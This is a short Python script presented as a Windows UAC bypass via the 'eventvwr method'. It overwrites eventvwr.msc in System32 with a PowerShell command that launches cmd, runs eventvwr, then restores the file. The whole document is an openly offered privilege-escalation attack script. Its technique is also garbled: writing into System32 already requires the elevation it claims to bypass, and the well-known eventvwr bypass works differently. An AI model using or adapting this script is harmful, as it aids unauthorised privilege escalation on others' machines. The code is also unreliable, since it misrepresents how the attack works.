import os
import shutil
import subprocess

def bypass_uac():
    target_path = r"C:\\Windows\\System32\\eventvwr.msc"
    if os.path.exists(target_path):
        backup_path = r"C:\\Windows\\System32\\eventvwr_backup.msc"
        exploit_path = r"C:\\Windows\\System32\\eventvwr.msc"

        # Backup the original file
        shutil.copyfile(target_path, backup_path)

        # Replace the target file with a malicious script
        with open(exploit_path, 'w') as exploit_file:
            exploit_file.write('powershell.exe -Command "Start-Process cmd -ArgumentList \'/c whoami\';"')

        # Execute the target file
        subprocess.run("eventvwr", shell=True)

        # Restore the original file
        shutil.copyfile(backup_path, target_path)
        os.remove(backup_path)
        print("UAC Bypass attempted using eventvwr method.")

# Example usage
bypass_uac()